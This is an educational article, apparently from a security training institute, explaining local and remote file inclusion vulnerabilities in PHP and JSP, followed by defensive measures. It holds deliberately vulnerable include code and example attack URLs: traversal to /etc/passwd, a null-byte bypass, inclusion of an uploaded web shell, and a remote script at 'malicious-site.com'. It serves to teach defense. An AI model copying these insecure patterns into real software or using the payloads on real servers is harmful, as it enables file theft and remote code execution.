:orphan:
(an-overview-of-file-inclusion-vulnerabilities)=
# An Overview of File Inclusion Vulnerabilities
 


Web applications are used for a wide range of purposes by individuals and different organizations. These web applications provide multiple benefits to their users as well as various functionalities. They are, nonetheless, vulnerable to malicious adversaries' attacks. The exploitation of some of these security weaknesses can impede the organization's key business processes, resulting in significant financial losses. As a result, it is very important to identify and fix such vulnerabilities discovered in the web application. File inclusion vulnerabilities are one of the most common types of vulnerabilities. This article discusses the many forms of file inclusion vulnerabilities, as well as their consequences and how to protect against them.

## What are File Inclusion Vulnerabilities?

When a web application permits the inclusion of a file or script at run time, it is vulnerable to file inclusion vulnerabilities. This happens when there are no or weak controls in the web application that don't properly validate the input supplied by the user. This allows the attacker to read, access, or modify restricted files on the web server or upload and run malicious scripts on the target web application. Many web applications are created based on programming languages like PHP, which can lead to different vulnerabilities if implemented incorrectly.

Web apps are created to give users access to resources such as files, images, text, and other information saved in a web application's database. A web application's input parameters allow the user to seek access to these resources. For example, consider the following URL on a web page:

`http://examplesite.com/home.php?file=somefile.php`

Now when this URL is visited, a GET request is sent to the backend web server that fetches the contents of this file and includes it in the web page. The parameter "file" in the URL includes the file "somefile.php" present locally on the web server. But if an adversary enters a malicious input and the web application accepts it without proper sanitization or validation, then it could lead to events with varying consequences. We will cover more on this later.

## PHP include function:

The PHP include function copies the contents of a specified file into the web page that is utilizing the include function. If an error occurs, the include() function issues a warning but does not terminate the script's execution, i.e. the script will continue to run. The PHP include function allows you to reuse code across numerous pages of your web application without having to retype it every time. Include statements are most commonly used in web page headers, footers, and menus. The include function in PHP uses the following syntax.:

`include("path_to_file_name");`

or

`include "path_to_file_name";`

For example, consider the code of the following web page of an application that is called header.php:

`<?php`

`echo "examplesite.com"`

`?>`

Now let's say our home page (i.e. home.php) includes this file as follows:

`<html>`

`<body>`

`<h1>Welcome our website </h1>`

`<?php include "header.php";?>`

`</body>`

`</html>`

So whenever the home.php web page will be visited by the user, it will include the file header.php present on the web server.

## Types of File Inclusion:

The two types of File Inclusion vulnerabilities are as follows:
1. Local File Inclusion
2. Remote File Inclusion

Each one of these types is discussed in more detail in the following section.

### Local File Inclusion:

The Local File Inclusion vulnerability allows an attacker to access, read or modify files on the victim server or even execute files that are present locally on the target machine. This can lead the attacker to gain access to sensitive data on the server if the privileges settings are not configured properly. This type of vulnerability can allow the attacker to pass file paths to the inputs of the web application. If there is no proper sanitization or validation of user input, then it can lead to the local file on the server being included in the web application's response to the attacker's request. In some situations, an attacker may even be able to upload malicious code such as a reverse shell or a back door on the target machine and then execute it to conduct more serious attacks.

### Remote File Inclusion:

An attacker can use the Remote File Inclusion vulnerability to include a file hosted on a remote machine instead of a local file on a web server. An attacker can then use this vulnerability to run a remote script on the target web server. When a web application accepts user input in the form of URLs and accepts that input as a file path without sufficient validation, a remote file inclusion vulnerability exists. As a result, an attacker can take advantage of this flaw to refer to a malicious script such as a web shell or a backdoor located on a remote machine. This script is then run with the permissions of the target web server.

### How does Local File Inclusion work:

In order to understand how the local file inclusion works let us consider our URL from the previous example i.e.:

`http://examplesite.com/home.php?file=somefile.php`

Let's suppose that the code at the backend of the website looks like this:

`<?php`

`include $_REQUEST['file'];`

`?>`

What this code is doing is that when the GET request for this URL is sent to the web application, it takes the value/path in the "file" parameter and uses it to include the contents of specific file in the web page. At this point, an attacker can utilize different techniques such as directory traversal to read, write, or execute files on the web server.

Directory traversal, also known as path traversal, is a web application vulnerability that allows an attacker to read or access different files on the web server outside its root directory such as user credentials stored in its database, system files, application code, or other sensitive data. In some cases, an attacker can write to or modify these files which can lead to their corruption. The attacker uses the ../ characters to escape the current directory and move to the directory at a higher level. A clever hacker can thus exploit this vulnerability to move out of the root directory of the web application and gets access to restricted files on the web server.

Now coming back to our example, when the GET request is sent to fetch the contents of the file, it searches for the file in the root directory of the website e.g. /var/www/html. If an attacker supplies the file path in the file parameter as ../../../../etc/passwd then our URL will look like this:

`http://examplesite.com/home.php?file=../../../../etc/passwd`

Now if there is no input validation mechanism that can filter such characters, then the attacker can successfully move out of the root directory of the website, goes to /etc directory, and fetch the contents of the /etc/passwd file. /etc/passwd file contains the information of every user that is registered on the linux operating system. 

### Null Terminator:

Sometimes an attacker can make use of the null terminator to get access to restricted files on the web server. Consider the following example to understand the concept of null terminator. Let us suppose the code at the backend of the web application looks like this:

`<?php`

`$file= $_GET['file'];`

`include($file.".php");`

`?>`

Now what this code does is that it appends a .php extension at the end of the filename supplied in the "file" parameter. If an attacker was to use the directory traversal technique given above, it would not work due to this issue. Now a smart attacker can use something null byte or a null terminator i.e. %00. This character is reserved and is used to indicate the end of a string or line. If this character appears in a string, then everything after this character is ignored. An attacker can use this character in the URL like this:

`http://examplesite.com/home.php/?file=../../../../etc/passwd%00`

By inserting this character at the end of the file path would cause the .php extension to be ignored and enables the attacker to read the contents of /etc/passwd file successfully.

In other cases an attacker can abuse the upload functionality of a web application to upload malware such as a PHP web shell. He can then include that web shell so that it gets executed. For example, an attacker can use something like this:

`http://examplesite.com/home.php/?file=../../../uploads/php_web_shell.php`

This will enable the attacker to access the uploads directory on the web server, includes the malicious file, and then executes it.

### How does Remote File Inclusion work:

In order for remote file inclusion to work on a web application based on PHP, it is necessary for the two functions to be enabled in the php.ini configuration file on the web server i.e. allow_url_fopen and allow_url_include. The php.ini file is the configuration file for the web server that holds all the PHP settings that will be used by it.

The allow_url_fopen function allows the scripts or files to be retrieved from the remote location such as web servers or FTP servers. This function makes it possible to include these remote files on the web application just like local files.

The allow_url_include function allows the inclusion of the remote file as PHP code using a URL rather than a local file path. The functions that can be used to include the remote files are: include, include_once, require, and require_once.

An attacker can carry out the testing of all inputs of the web application in hopes of finding the inputs that are vulnerable to Remote file inclusion. After determining the target inputs the attacker can then include the URL to a malicious file/script. Let's consider our URL from the previous examples i.e:

`http://examplesite.com/home.php?file=http://normalsite.com/some_remote_file`

Let's suppose the code in the backend of the application looks like this and includes the php file on the remote web server:

`<?php`

`$file=$_GET['file'];`

`include($file.".php");`

`?>`

Now if the web application is vulnerable to remote file inclusion, the attacker can supply the URL to the malicious script that is being hosted on his remote web server. For example the attacker inputs something like this in the "file" parameter:

`http://examplesite.com/home.php?file=http://malicious-site.com/malicious_script`

Thus in the absence of input validation mechanisms, the URL supplied in the "file" parameter is accepted by the web application. Now as the GET request is sent to the web application, the PHP code present in the malicious_script.php file gets included on the web page and therefore gets executed. This malicious_script.php file thus becomes a part of the include page of the web server and gets executed every time the web page is accessed.

Besides the PHP language, the JSP language is also vulnerable to local and remote file inclusion vulnerabilities. JSP (Java Server Pages) is a server-side programming language that is used in the creation of dynamic and platform-independent web applications. For example .jsp web page of the application has the following URL:

`http://examplesite.com/home.jsp?file=http://normalsite.com/test.js

The website uses an import directive to include the remote file URL specified by the "file" parameter as follows.

`<c:import url="<%=request.getParameter('file')%>">`

Now if an attacker specifies the "file" parameter that contains the link to the malicious script hosted on a remote server as follows:

`http://examplesite.com/home.jsp?test=http://malicious-site.com/malicious_script.js`

Thus due to insufficient input validation, the malicious file malicious_script.js gets included and executed on the target web server.

## Consequences of File inclusion Vulnerabilities:

The consequences of file inclusion vulnerabilities vary depending on the type of attack being carried out. Some of the repercussions of the exploitation of these vulnerabilities are as follows:

* Reading, accessing or modifying different files on the web server
* Unauthorized disclosure of sensitive information such as credentials stored in the back-end of the website, system files or application code 
* Installation and execution of malware such as web shells, backdoors, viruses, etc. on the web server
* Execution of malicious scripts on the client side leading to Cross Site Scripting attacks
* Complete compromise and take over of the web server
* Denial of Service attacks 

## How to protect against file inclusion vulnerabilities:

It is critical to implement multiple security techniques in tandem to protect against the exploitation of file inclusion vulnerabilities. Input validation measures alone are insufficient, and all user input cannot be entirely sanitized. As a result, several countermeasures must be used to construct an effective defense system. This section discusses some of the approaches that can be used to protect against file inclusion vulnerabilities.

* The most effective solution for removing file inclusion vulnerabilities is to prevent users from passing input into the file systems and framework API. However, if this is not possible then consider the implementation of the following security techniques to prevent the exploitation of these vulnerabilities.

* There should be proper validation and sanitization of user-supplied input. The user input in a web application should never be trusted and sufficient security controls must be present on the client as well as server side to properly filter user input. The user inputs that should be properly protected are: HTTP POST/GET parameters, URL parameters, Cookie values, and HTTP header values. The inputs to the web application should mainly accept letters and digits whereas all unnecessary special characters should not be allowed.

* Implement a whitelist of characters allowed for the purpose of sanitization of user-supplied input instead of a blacklist. Implementation of a blacklist to reject user input is a weaker defense mechanism as a clever attacker can easily bypass such controls by providing input in different formats such as encoding the input or use hexadecimal format.

* The web application should have a specific whitelist of file names or specific directories that are allowed to be included in a web application. According to the [OWASP](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion) testing guide for file inclusion vulnerabilities, all the accepted file names should have a corresponding identifier to access those files on the web server. Any request containing an invalid identifier can then simply be rejected. The implementation of such a mechanism will avoid directory traversal attacks. 

* The settings related to opening and including the remote files in the web application i.e. allow_url_fopen and allow_url_include must be disabled in the php.ini configuration file. If for some reason that is not possible then implement a whitelist of accepted remote files and the locations from which those files could be included.

* The execution of the uploaded files must be restricted. If the web application allows the user to upload files then implement a whitelist of allowed file extensions such as .pdf, .docx, .jpg, .png, etc. with an allowable limit of the file size.

* The web application must be rigorously tested before its deployment for the presence of such vulnerabilities. All the user inputs to the web application must be thoroughly tested and protected against exploitation. 

> **Do you want to get practical skills to work in cybersecurity or advance your career? Enrol in [MCSI Bootcamps](https://www.mosse-institute.com/bootcamps.html)!**